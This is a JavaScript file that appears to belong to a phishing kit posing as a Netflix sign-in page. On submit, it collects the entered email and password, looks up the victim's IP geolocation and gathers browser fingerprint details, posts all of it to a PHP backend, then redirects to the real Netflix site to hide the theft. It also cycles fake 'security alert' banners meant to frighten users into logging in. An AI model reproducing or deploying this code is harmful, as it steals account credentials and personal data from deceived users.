// Toggle password visibility
function togglePassword() {
    const passwordField = document.getElementById('password');
    const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordField.setAttribute('type', type);
}

// Close warning
function closeWarning() {
    document.getElementById('securityWarning').style.display = 'none';
}

// Get user location
async function getUserLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country_name,
            country_code: data.country_code,
            postal: data.postal,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.timezone,
            org: data.org,
            asn: data.asn
        };
    } catch (error) {
        return {
            ip: 'Unknown',
            city: 'Unknown',
            country: 'Unknown',
            error: error.message
        };
    }
}

// Submit form
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const submitBtn = document.getElementById('submitBtn');
    const spinner = document.getElementById('spinner');
    const btnText = submitBtn.querySelector('.btn-text');
    
    // Show loading state
    btnText.textContent = 'Verifying...';
    spinner.style.display = 'block';
    submitBtn.disabled = true;
    
    // Get form data
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Get user location and info
    const locationData = await getUserLocation();
    const userAgent = navigator.userAgent;
    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const language = navigator.language;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const platform = navigator.platform;
    
    // Create data object
    const formData = {
        email: email,
        password: password,
        location: locationData,
        user_agent: userAgent,
        screen_resolution: screenResolution,
        language: language,
        timezone: timezone,
        platform: platform,
        referrer: document.referrer || 'Direct',
        timestamp: new Date().toISOString(),
        cookies_enabled: navigator.cookieEnabled,
        do_not_track: navigator.doNotTrack || 'Unknown'
    };
    
    // Send data to PHP backend
    try {
        const response = await fetch('process.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams(formData)
        });
        
        const result = await response.json();
        
        if (result.success) {
            // Show success message then redirect
            btnText.textContent = 'Success! Redirecting...';
            setTimeout(() => {
                window.location.href = 'https://www.netflix.com';
            }, 1500);
        } else {
            // Show error
            btnText.textContent = 'Error - Try Again';
            spinner.style.display = 'none';
            submitBtn.disabled = false;
            
            // Update warning message
            document.getElementById('warningText').textContent = 
                'Login failed. Please check your credentials and try again.';
            
            // Reset button after 2 seconds
            setTimeout(() => {
                btnText.textContent = 'Sign In';
                submitBtn.disabled = false;
            }, 2000);
        }
    } catch (error) {
        // Fallback to direct form submission
        btnText.textContent = 'Connecting...';
        this.submit();
    }
});

// Dynamic warning messages
const warnings = [
    "⚠️ SECURITY ALERT: Unusual login activity detected from your region.",
    "🔒 ACCOUNT PROTECTION: We've detected multiple failed attempts. Verify your identity.",
    "🚨 SUSPICIOUS ACTIVITY: Login attempt from unrecognized device/location.",
    "⚠️ WARNING: Your account may be compromised. Please verify your details.",
    "🔐 SECURITY NOTICE: Enable two-factor authentication for added protection."
];

// Rotate warning messages
let warningIndex = 0;
function rotateWarning() {
    const warningText = document.getElementById('warningText');
    warningText.style.opacity = '0';
    
    setTimeout(() => {
        warningText.textContent = warnings[warningIndex];
        warningText.style.opacity = '1';
        warningIndex = (warningIndex + 1) % warnings.length;
    }, 500);
}

// Change warning every 10 seconds
setInterval(rotateWarning, 10000);

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    // Add input focus effects
    const inputs = document.querySelectorAll('.input-field');
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.style.transform = 'translateY(-2px)';
        });
        
        input.addEventListener('blur', function() {
            this.parentElement.style.transform = 'translateY(0)';
        });
    });
});